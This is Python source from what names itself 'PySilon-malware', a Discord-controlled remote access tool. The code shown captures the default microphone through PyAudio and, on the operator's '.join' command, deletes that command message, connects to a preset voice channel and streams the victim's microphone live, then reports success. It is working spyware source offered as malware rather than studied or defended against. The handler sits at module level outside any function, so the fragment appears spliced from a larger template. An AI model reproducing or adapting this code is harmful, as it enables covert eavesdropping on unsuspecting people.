from resources.misc import *
import pyaudio
import sys
import os
import discord
import asyncio

bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, 'libopus-0.x64.dll'))
if not discord.opus.is_loaded() and os.path.exists(opuslib_path):
    discord.opus.load_opus(opuslib_path)

class PyAudioPCM(discord.AudioSource):
    def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
        self.p = pyaudio.PyAudio()
        self.chunks = chunk
        
        if input_device is None:
            try:
                input_device = self.p.get_default_input_device_info()['index']
            except Exception:
                input_device = None

        self.input_stream = self.p.open(
            format=pyaudio.paInt16,
            channels=channels,
            rate=rate,
            input=True,
            input_device_index=input_device,
            frames_per_buffer=chunk
        )

    def read(self) -> bytes:
        try:
            return self.input_stream.read(self.chunks, exception_on_overflow=False)
        except Exception:
            return b'\x00' * (self.chunks * 4)

    def cleanup(self) -> None:
        try:
            if self.input_stream.is_active():
                self.input_stream.stop_stream()
            self.input_stream.close()
            self.p.terminate()
        except Exception:
            pass

if message.content.startswith('.join'):
    await message.delete()
    canal_voz = client.get_channel(channel_ids['voice'])
    
    if canal_voz:
        voice_client = message.guild.voice_client if message.guild else None
        if voice_client and voice_client.is_connected():
            await voice_client.move_to(canal_voz)
        else:
            voice_client = await canal_voz.connect(self_deaf=True)
        
        if voice_client.is_playing():
            voice_client.stop()

        voice_client.play(PyAudioPCM())
        
        embed = discord.Embed(title="🟢 Success", description=f'```Joined voice-channel and streaming microphone in realtime```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
